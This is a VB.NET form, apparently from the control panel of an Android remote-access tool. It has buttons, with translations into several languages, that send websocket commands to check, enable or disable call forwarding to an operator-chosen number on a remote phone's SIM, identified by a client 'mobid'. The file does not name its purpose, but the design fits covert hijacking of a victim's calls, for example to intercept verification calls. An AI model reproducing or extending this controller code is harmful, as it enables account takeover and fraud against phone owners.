Imports System.Net.Sockets

Public Class callforwarding
    Public Btcli As BTClient

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                checkbtn.Text = "التحقق" 'check
                enblebtn.Text = "تفعيل" 'enable
                disablebtn.Text = "تعطيل" 'disable
                phonetext.Watermark = "رقم إعادة التوجيه, مثل ..0091111" 'Redirect number, ex: 0091111...
                Exit Select

            Case "CN" ' Chinese
                checkbtn.Text = "检查"
                enblebtn.Text = "启用"
                disablebtn.Text = "禁用"
                phonetext.Watermark = "转接号码，例如：0091111"
                Exit Select

            Case "RU" ' Russian
                checkbtn.Text = "Проверить"
                enblebtn.Text = "Включить"
                disablebtn.Text = "Отключить"
                phonetext.Watermark = "Номер переадресации, напр.: 0091111"
                Exit Select

            Case "TR" ' Turkish
                checkbtn.Text = "Kontrol et"
                enblebtn.Text = "Etkinleştir"
                disablebtn.Text = "Devre dışı bırak"
                phonetext.Watermark = "Yönlendirme numarası, örn: 0091111"
                Exit Select

            Case "SP" ' Spanish
                checkbtn.Text = "Verificar"
                enblebtn.Text = "Habilitar"
                disablebtn.Text = "Deshabilitar"
                phonetext.Watermark = "Número de redirección, ej.: 0091111"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                checkbtn.Text = "Verificar"
                enblebtn.Text = "Ativar"
                disablebtn.Text = "Desativar"
                phonetext.Watermark = "Número de redirecionamento, ex: 0091111"
                Exit Select

            Case Else
                ' Handle any other cases or defaults here

        End Select
    End Sub


    Private Sub callforwarding_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        translateme()
        myico.Image = Btcli.wallpaper
        mytitle.Text = Btcli.name
    End Sub
    Private Sub mytitle_MouseDown(sender As Object, e As MouseEventArgs) Handles mytitle.MouseDown, myico.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub closbtn_Click(sender As Object, e As EventArgs) Handles closbtn.Click
        Me.Close()
    End Sub
    Dim keepmeto As Boolean = True
    Private Sub pinbtn_Click(sender As Object, e As EventArgs) Handles pinbtn.Click
        If keepmeto Then
            '  button1.Text = "yes on top"
            pinbtn.ForeColor = Color.DeepSkyBlue
            pinbtn.RectColor = Color.DeepSkyBlue
            Dim HwndTopmost As IntPtr = New IntPtr(-1)
            SetWindowPos(Me.Handle, HwndTopmost, 0, 0, 0, 0, TOPMOST_FLAGS)
            keepmeto = False
        Else
            '  button1.Text = "not on top"
            pinbtn.ForeColor = Color.White
            pinbtn.RectColor = Color.Gray
            Dim HwndTopmost As IntPtr = New IntPtr(-2)
            SetWindowPos(Me.Handle, HwndTopmost, 0, 0, 0, 0, TOPMOST_FLAGS)
            keepmeto = True
        End If
    End Sub

    Private Sub pausebtn_Click(sender As Object, e As EventArgs) Handles checkbtn.Click
        Dim simid As String = combosims.SelectedIndex.ToString
        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "calf"},
                                 {"cfstate", "0"},
                                 {"extrs", simid}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles enblebtn.Click
        Dim number As String = phonetext.Text
        Dim simid As String = combosims.SelectedIndex.ToString
        If isEmpty(number) Then
            BTAlerter.infos(slctnumbstr)
            Return
        End If
        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "calf"},
                                 {"cfstate", "1"},
                                 {"numb", number},
                                 {"extrs", simid}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)

    End Sub

    Private Sub phonetext_TextChanged(sender As Object, e As EventArgs) Handles phonetext.TextChanged
        Dim tb = CType(sender, TextBox)
        tb.Text = System.Text.RegularExpressions.Regex.Replace(tb.Text, "[^\d]", "")
        tb.SelectionStart = tb.Text.Length ' Keep cursor at the end
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles disablebtn.Click
        Dim simid As String = combosims.SelectedIndex.ToString
        Dim chatData As New Dictionary(Of String, Object) From {
                                 {"msg", "calf"},
                                 {"cfstate", "2"},
                                 {"extrs", simid}
        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub
End Class